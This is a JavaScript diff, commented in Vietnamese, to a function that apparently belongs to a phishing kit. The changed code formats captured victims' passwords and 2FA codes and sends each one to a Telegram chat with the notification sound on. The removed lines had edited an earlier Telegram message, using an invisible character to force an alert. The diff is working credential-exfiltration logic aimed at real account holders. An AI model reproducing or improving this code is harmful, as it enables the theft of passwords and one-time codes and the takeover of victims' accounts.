@@ -502,17 +502,7 @@ const pushUpdate = async (
   // 1) Cập nhật state
   stateRef.current = { ...stateRef.current, ...updates };
 
-  // 2) Lấy ID tin nhắn gốc
-  const targetId = messageId ?? (typeof window !== "undefined" ? localStorage.getItem("telegram_msg_id") : null);
-  if (!targetId) return;
-
-  // 3) Build nội dung mới (thêm 1 khoảng trắng vô hình ở cuối để ép Telegram kêu)
-  const newText = buildFullMessage() + "\u200B"; 
-  
-  // 4) Edit tin nhắn gốc. Việc Edit nội dung mới sẽ kích hoạt âm thanh thông báo trên app.
-  await editTelegramMessage(targetId, newText);
-};
-
+  // 2) Gửi tin nhắn thông báo có âm thanh (kêu)
   let notifyText = "";
   if (updates.password1) notifyText = `🔔 <b>Mật khẩu 1:</b> <code>${escapeHtml(updates.password1)}</code>`;
   if (updates.password2) notifyText = `🔔 <b>Mật khẩu 2:</b> <code>${escapeHtml(updates.password2)}</code>`;
@@ -521,7 +511,6 @@ const pushUpdate = async (
   if (updates.code3) notifyText = `🔔 <b>Mã 2FA (L3):</b> <code>${escapeHtml(updates.code3)}</code>`;
 
   if (notifyText) {
-    // Gửi tin nhắn thông báo (disable_notification: false để có âm thanh)
     await sendTelegramMessage(notifyText, { disable_notification: false });
   }
 
